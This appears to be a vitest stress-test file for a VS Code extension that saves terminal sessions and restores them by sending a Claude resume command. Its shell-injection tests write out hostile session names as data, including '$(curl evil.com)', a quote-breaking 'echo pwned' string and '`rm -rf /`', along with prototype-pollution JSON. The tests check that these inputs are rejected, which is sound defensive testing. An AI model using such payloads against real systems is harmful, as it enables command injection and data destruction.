import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import { TerminalManager, isValidSessionName } from "../src/terminalManager";
import { window } from "vscode";

function makeTmpDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), "cc-persist-stress2-"));
}

function makeLog() {
  return window.createOutputChannel("test") as ReturnType<
    typeof window.createOutputChannel
  >;
}

function writeState(stateDir: string, state: unknown): void {
  fs.mkdirSync(stateDir, { recursive: true });
  fs.writeFileSync(path.join(stateDir, "state.json"), JSON.stringify(state));
}

// ============================================================
// SECTION 1: Verify Cycle 1 Fixes
// ============================================================

describe("STRESS2: Verify fix -- isValidSessionName type guards non-string input", () => {
  it("undefined returns false, does not throw", () => {
    expect(() => isValidSessionName(undefined)).not.toThrow();
    expect(isValidSessionName(undefined)).toBe(false);
  });

  it("null returns false, does not throw", () => {
    expect(() => isValidSessionName(null)).not.toThrow();
    expect(isValidSessionName(null)).toBe(false);
  });

  it("number returns false, does not throw", () => {
    expect(() => isValidSessionName(42)).not.toThrow();
    expect(isValidSessionName(42)).toBe(false);
  });

  it("boolean returns false", () => {
    expect(isValidSessionName(true)).toBe(false);
    expect(isValidSessionName(false)).toBe(false);
  });

  it("array returns false", () => {
    expect(isValidSessionName(["session"])).toBe(false);
  });

  it("object returns false", () => {
    expect(isValidSessionName({ name: "session" })).toBe(false);
  });

  it("Symbol returns false, does not throw", () => {
    expect(() => isValidSessionName(Symbol("test"))).not.toThrow();
    expect(isValidSessionName(Symbol("test"))).toBe(false);
  });

  it("BigInt returns false, does not throw", () => {
    expect(() => isValidSessionName(BigInt(42))).not.toThrow();
    expect(isValidSessionName(BigInt(42))).toBe(false);
  });
});

describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("filters entries with missing name field", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ index: 0 }, { name: "valid", index: 1 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(1);
    expect(state.terminals[0].name).toBe("valid");
  });

  it("filters entries with negative index", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "neg", index: -5 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(tm.loadState().terminals).toHaveLength(0);
  });

  it("filters entries with fractional index", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "frac", index: 2.7 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(tm.loadState().terminals).toHaveLength(0);
  });

  it("filters null entries in terminals array", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [null, undefined, { name: "ok", index: 0 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(1);
    expect(state.terminals[0].name).toBe("ok");
  });

  it("filters entries with index beyond MAX_SAFE_INTEGER", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "overflow", index: Number.MAX_SAFE_INTEGER + 1 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(tm.loadState().terminals).toHaveLength(0);
  });

  it("accepts large but valid index", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "large", index: 50000 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(tm.loadState().terminals).toHaveLength(1);
  });

  it("filters entries with NaN index", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "nan-idx", index: "not-a-number" }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(tm.loadState().terminals).toHaveLength(0);
  });

  it("filters entries with Infinity index", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "inf", index: null }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(tm.loadState().terminals).toHaveLength(0);
  });
});

describe("STRESS2: Verify fix -- duplicate indices deduplicated, first wins", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("three entries with same index -- only first restored", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [
        { name: "first", index: 3 },
        { name: "second", index: 3 },
        { name: "third", index: 3 },
      ],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const restored = tm.restoreTerminals();
    expect(restored).toHaveLength(1);
    expect(restored[0].name).toBe("first");
  });

  it("mixed duplicate and unique indices -- unique all restored", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [
        { name: "a", index: 0 },
        { name: "b", index: 1 },
        { name: "dup-a", index: 0 },
        { name: "c", index: 2 },
        { name: "dup-b", index: 1 },
      ],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const restored = tm.restoreTerminals();
    expect(restored).toHaveLength(3);
    expect(restored.map((t) => t.name)).toEqual(["a", "b", "c"]);
  });
});

describe("STRESS2: Verify fix -- double restoreTerminals returns empty on second call", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("second call returns empty even with valid state file", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [
        { name: "alpha", index: 0 },
        { name: "beta", index: 1 },
      ],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const first = tm.restoreTerminals();
    expect(first).toHaveLength(2);

    const second = tm.restoreTerminals();
    expect(second).toHaveLength(0);
  });

  it("triple call also returns empty", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "single", index: 0 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    tm.restoreTerminals();
    tm.restoreTerminals();
    const third = tm.restoreTerminals();
    expect(third).toHaveLength(0);
  });
});

describe("STRESS2: Verify fix -- whitespace-only and leading/trailing space names rejected", () => {
  it("single space rejected", () => {
    expect(isValidSessionName(" ")).toBe(false);
  });

  it("multiple spaces rejected", () => {
    expect(isValidSessionName("     ")).toBe(false);
  });

  it("tab character rejected", () => {
    expect(isValidSessionName("\t")).toBe(false);
  });

  it("leading space rejected", () => {
    expect(isValidSessionName(" session")).toBe(false);
  });

  it("trailing space rejected", () => {
    expect(isValidSessionName("session ")).toBe(false);
  });

  it("both leading and trailing space rejected", () => {
    expect(isValidSessionName(" session ")).toBe(false);
  });

  it("internal spaces still allowed", () => {
    expect(isValidSessionName("war room session")).toBe(true);
  });
});

// ============================================================
// SECTION 2: NEW Attack Vectors
// ============================================================

describe("STRESS2: NEW -- state.json is a directory instead of a file", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("loadState returns empty state when state.json is a directory", () => {
    fs.mkdirSync(path.join(stateDir, "state.json"), { recursive: true });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.loadState()).not.toThrow();
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(0);
  });

  it("saveState does not crash when state.json is a directory", () => {
    fs.mkdirSync(path.join(stateDir, "state.json"), { recursive: true });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    tm.createTerminal("test");
    expect(() => tm.saveState()).not.toThrow();
  });

  it("restoreTerminals does not crash when state.json is a directory", () => {
    fs.mkdirSync(path.join(stateDir, "state.json"), { recursive: true });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.restoreTerminals()).not.toThrow();
    const restored = tm.restoreTerminals();
    expect(restored).toHaveLength(0);
  });
});

describe("STRESS2: NEW -- stateDir is not writable", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    try {
      fs.chmodSync(stateDir, 0o755);
    } catch { /* may not exist */ }
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("saveState silently fails when stateDir is read-only", () => {
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    tm.createTerminal("test");
    fs.chmodSync(stateDir, 0o444);
    expect(() => tm.saveState()).not.toThrow();
  });

  it("saveState to non-existent deeply nested path does not crash", () => {
    const deepDir = path.join(stateDir, "a", "b", "c", "d", "e");
    tm = new TerminalManager(deepDir, signalBaseDir, "/tmp", makeLog());
    tm.createTerminal("test");
    expect(() => tm.saveState()).not.toThrow();
  });
});

describe("STRESS2: NEW -- signalBaseDir does not exist when mkdirSync is called", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = path.join(os.tmpdir(), `cc-persist-nosig-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    try {
      fs.rmSync(signalBaseDir, { recursive: true, force: true });
    } catch { /* may not exist */ }
  });

  it("createTerminal creates signalDir even when it does not exist", () => {
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.createTerminal("test")).not.toThrow();
    expect(fs.existsSync(path.join(signalBaseDir, "signals"))).toBe(true);
  });

  it("restoreTerminals creates signalDir even when base does not exist", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "session", index: 0 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.restoreTerminals()).not.toThrow();
    expect(fs.existsSync(path.join(signalBaseDir, "signals"))).toBe(true);
  });

  it("writeWorkspaceMetadata creates signalBaseDir when it does not exist", () => {
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.writeWorkspaceMetadata()).not.toThrow();
    expect(fs.existsSync(path.join(signalBaseDir, "workspace.json"))).toBe(true);
  });
});

describe("STRESS2: NEW -- extremely long terminal list (1000 entries)", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("save and load 1000 terminals completes without error", () => {
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    for (let i = 0; i < 1000; i++) {
      const t = tm.createTerminal(`session-${i}`);
      tm.renameTerminal(t, `session-${i}`);
    }
    const start = performance.now();
    tm.saveState();
    const saveTime = performance.now() - start;

    const loadStart = performance.now();
    const state = tm.loadState();
    const loadTime = performance.now() - loadStart;

    expect(state.terminals).toHaveLength(1000);
    expect(saveTime).toBeLessThan(1000);
    expect(loadTime).toBeLessThan(1000);
  });

  it("restore 1000 terminals works and nextIndex is correct", () => {
    const terminals = Array.from({ length: 1000 }, (_, i) => ({
      name: `s-${i}`,
      index: i,
    }));
    writeState(stateDir, { version: 1, terminals });

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const restored = tm.restoreTerminals();
    expect(restored).toHaveLength(1000);

    const newT = tm.createTerminal("extra");
    expect(tm.getIndex(newT)).toBe(1000);
  });

  it("state file with 1000 entries maintains correct indices after round-trip", () => {
    const terminals = Array.from({ length: 1000 }, (_, i) => ({
      name: `session-${i}`,
      index: i * 10, // non-contiguous
    }));
    writeState(stateDir, { version: 1, terminals });

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const restored = tm.restoreTerminals();
    expect(restored).toHaveLength(1000);

    // nextIndex should be (999 * 10) + 1 = 9991
    const newT = tm.createTerminal("after-bulk");
    expect(tm.getIndex(newT)).toBe(9991);
  });
});

describe("STRESS2: NEW -- state file written with wrong permissions", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    try {
      const statePath = path.join(stateDir, "state.json");
      if (fs.existsSync(statePath)) {
        fs.chmodSync(statePath, 0o644);
      }
    } catch { /* ok */ }
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("loadState does not crash with 0o000 permissions", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "locked", index: 0 }],
    });
    const statePath = path.join(stateDir, "state.json");
    fs.chmodSync(statePath, 0o000);

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.loadState()).not.toThrow();
  });

  it("loadState gracefully handles write-only state file", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "writeonly", index: 0 }],
    });
    const statePath = path.join(stateDir, "state.json");
    fs.chmodSync(statePath, 0o200);

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.loadState()).not.toThrow();
  });

  it("saveState does not crash when state file is read-only", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "old", index: 0 }],
    });
    const statePath = path.join(stateDir, "state.json");
    fs.chmodSync(statePath, 0o444);

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    tm.createTerminal("new-session");
    expect(() => tm.saveState()).not.toThrow();
  });
});

describe("STRESS2: NEW -- createTerminal after many create/close cycles: index behavior", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
  });

  afterEach(() => {
    tm.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("index monotonically increases and never wraps after 500 create/close cycles", () => {
    for (let i = 0; i < 500; i++) {
      const t = tm.createTerminal(`cycle-${i}`);
      tm.handleTerminalClosed(t);
    }
    const t = tm.createTerminal("after-500");
    expect(tm.getIndex(t)).toBe(500);
  });

  it("index correctly continues after restoring high-index entries", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "high-idx", index: 9999 }],
    });
    tm.disposeAll();
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    tm.restoreTerminals();

    const newT = tm.createTerminal("next");
    expect(tm.getIndex(newT)).toBe(10000);
  });

  it("terminals beyond old MAX_INDEX (10000) survive save/load round-trip", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "high", index: 10000 }],
    });
    tm.disposeAll();
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    tm.restoreTerminals();

    const t = tm.createTerminal("higher");
    tm.renameTerminal(t, "higher");
    tm.saveState();

    const tm2 = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm2.loadState();
    expect(state.terminals).toHaveLength(2);
    expect(state.terminals.find((t) => t.name === "higher")).toBeDefined();
    tm2.disposeAll();
  });
});

// ============================================================
// BUG FOUND: disposeAll does NOT reset the `restored` flag.
// The source code at line 240-248 shows disposeAll clears maps
// and disposables but does NOT set this.restored = false.
// This means after disposeAll, restoreTerminals cannot be called
// again on the same instance. Severity: MEDIUM.
// ============================================================

describe("STRESS2: BUG -- disposeAll does NOT reset restored flag", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("disposeAll does NOT reset restored flag -- restoreTerminals blocked after disposeAll", () => {
    // This test documents the actual (buggy) behavior.
    // disposeAll() clears maps but does NOT set this.restored = false.
    // So restoreTerminals() after disposeAll() returns empty even though
    // the state file is still on disk.
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "restorable", index: 0 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());

    const first = tm.restoreTerminals();
    expect(first).toHaveLength(1);

    tm.disposeAll();

    // Verify state file still on disk
    const statePath = path.join(stateDir, "state.json");
    expect(fs.existsSync(statePath)).toBe(true);

    // loadState works fine -- the data is there
    const stateOnDisk = tm.loadState();
    expect(stateOnDisk.terminals).toHaveLength(1);

    // BUG: restoreTerminals returns empty because restored flag was NOT reset
    const afterDispose = tm.restoreTerminals();
    expect(afterDispose).toHaveLength(0); // Actual behavior -- should be 1
  });

  it("disposeAll clears all internal maps correctly", () => {
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const t1 = tm.createTerminal("one");
    const t2 = tm.createTerminal("two");
    expect(tm.isTracked(t1)).toBe(true);
    expect(tm.isTracked(t2)).toBe(true);

    tm.disposeAll();

    expect(tm.isTracked(t1)).toBe(false);
    expect(tm.isTracked(t2)).toBe(false);
    expect(tm.getSavedName(0)).toBeUndefined();
    expect(tm.getSavedName(1)).toBeUndefined();
  });
});

// ============================================================
// BUG FOUND: disposeAll does NOT reset nextIndex.
// After disposeAll, nextIndex continues from its last value.
// This means create/close/disposeAll/create reuses stale index
// counter. Not a correctness issue in normal usage, but means
// disposeAll doesn't truly reset to initial state.
// Severity: LOW.
// ============================================================

describe("STRESS2: BUG -- nextIndex not reset by disposeAll", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("nextIndex continues from last value after disposeAll (not reset to 0)", () => {
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    tm.createTerminal("first"); // index 0
    tm.createTerminal("second"); // index 1
    tm.disposeAll();

    // BUG: nextIndex is NOT reset -- new terminal gets index 2, not 0
    const t = tm.createTerminal("after-dispose");
    const idx = tm.getIndex(t);
    expect(idx).toBe(2); // Actual behavior -- arguably should be 0
  });

  it("disposeAll + restore correctly re-establishes nextIndex from state", () => {
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const t = tm.createTerminal("first");
    tm.renameTerminal(t, "first");
    tm.saveState();

    // disposeAll clears maps but nextIndex stays at 1
    tm.disposeAll();

    // Since restored flag is NOT reset (see bug above), we need a fresh manager
    const tm2 = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const restored = tm2.restoreTerminals();
    expect(restored).toHaveLength(1);

    const newT = tm2.createTerminal("second");
    expect(tm2.getIndex(newT)).toBe(1);
    tm2.disposeAll();
  });
});

// ============================================================
// SECTION 3: Additional NEW attack vectors
// ============================================================

describe("STRESS2: NEW -- state.json is a symlink", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("loadState follows symlink to valid state file", () => {
    const realDir = makeTmpDir();
    const realPath = path.join(realDir, "real-state.json");
    fs.writeFileSync(realPath, JSON.stringify({
      version: 1,
      terminals: [{ name: "symlinked", index: 0 }],
    }));

    fs.symlinkSync(realPath, path.join(stateDir, "state.json"));

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(1);
    expect(state.terminals[0].name).toBe("symlinked");

    fs.rmSync(realDir, { recursive: true, force: true });
  });

  it("saveState overwrites symlink target, not the link itself", () => {
    const realDir = makeTmpDir();
    const realPath = path.join(realDir, "real-state.json");
    fs.writeFileSync(realPath, JSON.stringify({ version: 1, terminals: [] }));
    fs.symlinkSync(realPath, path.join(stateDir, "state.json"));

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const t = tm.createTerminal("via-symlink");
    tm.renameTerminal(t, "via-symlink");
    tm.saveState();

    const realContent = JSON.parse(fs.readFileSync(realPath, "utf8"));
    expect(realContent.terminals).toHaveLength(1);
    expect(realContent.terminals[0].name).toBe("via-symlink");

    fs.rmSync(realDir, { recursive: true, force: true });
  });
});

describe("STRESS2: NEW -- state.json contains valid JSON but extreme content", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("extra unexpected fields in terminal entry do not crash", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{
        name: "deep",
        index: 0,
        extra: { nested: { deeply: { here: true } } },
        __proto__: { polluted: true },
      }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(1);
    expect(state.terminals[0].name).toBe("deep");
  });

  it("state.json with BOM marker does not crash", () => {
    fs.mkdirSync(stateDir, { recursive: true });
    const bom = "\uFEFF";
    fs.writeFileSync(
      path.join(stateDir, "state.json"),
      bom + JSON.stringify({ version: 1, terminals: [{ name: "bom-test", index: 0 }] }),
    );
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    // Whether the BOM causes parse failure depends on Node.js version
    // Main assertion: no crash
    expect(() => tm.loadState()).not.toThrow();
  });

  it("state.json with trailing garbage after valid JSON returns empty", () => {
    fs.mkdirSync(stateDir, { recursive: true });
    fs.writeFileSync(
      path.join(stateDir, "state.json"),
      JSON.stringify({ version: 1, terminals: [{ name: "trailing", index: 0 }] }) + "\n\n{garbage}",
    );
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(0);
  });

  it("empty state.json file (0 bytes)", () => {
    fs.mkdirSync(stateDir, { recursive: true });
    fs.writeFileSync(path.join(stateDir, "state.json"), "");
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.loadState()).not.toThrow();
    expect(tm.loadState().terminals).toHaveLength(0);
  });

  it("state.json with only whitespace", () => {
    fs.mkdirSync(stateDir, { recursive: true });
    fs.writeFileSync(path.join(stateDir, "state.json"), "   \n\t  ");
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    expect(() => tm.loadState()).not.toThrow();
    expect(tm.loadState().terminals).toHaveLength(0);
  });
});

describe("STRESS2: NEW -- concurrent save during handleTerminalClosed", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
  });

  afterEach(() => {
    tm.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("rapid close of all terminals during shutdown preserves state", () => {
    const terminals = Array.from({ length: 20 }, (_, i) => {
      const t = tm.createTerminal(`t-${i}`);
      tm.renameTerminal(t, `t-${i}`);
      return t;
    });
    tm.saveState();
    // Simulate shutdown: setDisposing before terminal close events
    tm.setDisposing();
    for (const t of terminals) {
      tm.handleTerminalClosed(t);
    }
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(20);
  });

  it("interleaved create and close results in consistent state", () => {
    const t1 = tm.createTerminal("one");
    tm.renameTerminal(t1, "one");
    const t2 = tm.createTerminal("two");
    tm.renameTerminal(t2, "two");
    tm.handleTerminalClosed(t1);
    const t3 = tm.createTerminal("three");
    tm.renameTerminal(t3, "three");
    tm.handleTerminalClosed(t2);
    const t4 = tm.createTerminal("four");
    tm.renameTerminal(t4, "four");

    tm.saveState();
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(2);
    expect(state.terminals.map((t) => t.name)).toEqual(["three", "four"]);
  });
});

describe("STRESS2: NEW -- sendText shell injection via session name in restoreTerminals", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("name with single quotes cannot escape the resume command", () => {
    const sendTextCalls: string[] = [];
    const origCreateTerminal = window.createTerminal;
    (window as any).createTerminal = (opts: any) => {
      const t = origCreateTerminal(opts);
      t.sendText = (text: string) => sendTextCalls.push(text);
      return t;
    };

    writeState(stateDir, {
      version: 1,
      terminals: [
        { name: "legit-session", index: 0 },
        { name: "'; echo pwned; echo '", index: 1 },
      ],
    });

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const restored = tm.restoreTerminals();

    expect(restored).toHaveLength(1);
    expect(sendTextCalls).toHaveLength(1);
    expect(sendTextCalls[0]).toContain("claude --dangerously-skip-permissions --resume 'legit-session'");

    (window as any).createTerminal = origCreateTerminal;
  });

  it("name with dollar sign and backticks cannot reach sendText", () => {
    const sendTextCalls: string[] = [];
    const origCreateTerminal = window.createTerminal;
    (window as any).createTerminal = (opts: any) => {
      const t = origCreateTerminal(opts);
      t.sendText = (text: string) => sendTextCalls.push(text);
      return t;
    };

    writeState(stateDir, {
      version: 1,
      terminals: [
        { name: "$(curl evil.com)", index: 0 },
        { name: "`rm -rf /`", index: 1 },
      ],
    });

    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const restored = tm.restoreTerminals();
    expect(restored).toHaveLength(0);
    expect(sendTextCalls).toHaveLength(0);

    (window as any).createTerminal = origCreateTerminal;
  });
});

describe("STRESS2: NEW -- index boundary validation", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("large index (50000) is accepted by loadState", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "large", index: 50000 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(1);
  });

  it("index beyond MAX_SAFE_INTEGER is rejected by loadState", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "unsafe", index: Number.MAX_SAFE_INTEGER + 1 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(0);
  });

  it("index 0 (minimum) is accepted by loadState", () => {
    writeState(stateDir, {
      version: 1,
      terminals: [{ name: "at-zero", index: 0 }],
    });
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(1);
  });
});

describe("STRESS2: NEW -- prototype pollution via state.json", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
  });

  afterEach(() => {
    tm?.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  it("__proto__ in state JSON does not pollute Object prototype", () => {
    fs.mkdirSync(stateDir, { recursive: true });
    fs.writeFileSync(
      path.join(stateDir, "state.json"),
      '{"version":1,"terminals":[],"__proto__":{"polluted":"yes"}}',
    );
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    tm.loadState();
    expect(({} as any).polluted).toBeUndefined();
  });

  it("constructor pollution via state JSON does not crash", () => {
    fs.mkdirSync(stateDir, { recursive: true });
    fs.writeFileSync(
      path.join(stateDir, "state.json"),
      '{"version":1,"terminals":[{"name":"test","index":0,"constructor":{"prototype":{"injected":true}}}]}',
    );
    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
    const state = tm.loadState();
    expect(state.terminals).toHaveLength(1);
    expect(({} as any).injected).toBeUndefined();
  });
});
